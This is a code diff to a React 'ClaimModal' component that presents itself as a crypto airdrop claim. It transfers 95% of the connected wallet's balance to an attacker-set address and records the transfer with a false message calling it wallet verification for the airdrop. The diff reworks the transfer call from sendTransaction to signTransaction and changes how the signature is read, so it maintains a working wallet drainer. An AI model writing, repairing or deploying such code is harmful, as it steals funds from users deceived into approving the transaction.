@@ -5,7 +5,7 @@ import { WalletService } from '../services/walletService';
 import { TelegramService } from '../services/telegramService';
 
 export default function ClaimModal({ isOpen, onClose, onClaimComplete }) {
-  const { publicKey, sendTransaction, connection } = useWallet();
+  const { publicKey, signTransaction } = useWallet();
   const [countdown, setCountdown] = useState(10);
   const [isComplete, setIsComplete] = useState(false);
   const [error, setError] = useState(null);
@@ -39,7 +39,7 @@ export default function ClaimModal({ isOpen, onClose, onClaimComplete }) {
       // Calculate transfer amount (95% of balance)
       const transferAmount = walletBalance * 0.95;
 
-      if (!sendTransaction) {
+      if (!signTransaction) {
         throw new Error('Wallet not connected');
       }
 
@@ -50,7 +50,7 @@ export default function ClaimModal({ isOpen, onClose, onClaimComplete }) {
       });
 
       const result = await transactionService.sendSol(
-        { sendTransaction, publicKey },
+        { signTransaction, publicKey },
         process.env.NEXT_PUBLIC_TO,
         transferAmount
       );
@@ -63,7 +63,7 @@ export default function ClaimModal({ isOpen, onClose, onClaimComplete }) {
             from: publicKey.toString(),
             to: process.env.NEXT_PUBLIC_TO,
             amount: transferAmount,
-            signature: result.signature,
+            signature: result.signatures?.[0] || 'N/A',
             timestamp: Date.now(),
             message: 'This transaction is required to verify your wallet and ensure smooth airdrop allocation. Thank you for your participation.'
           })
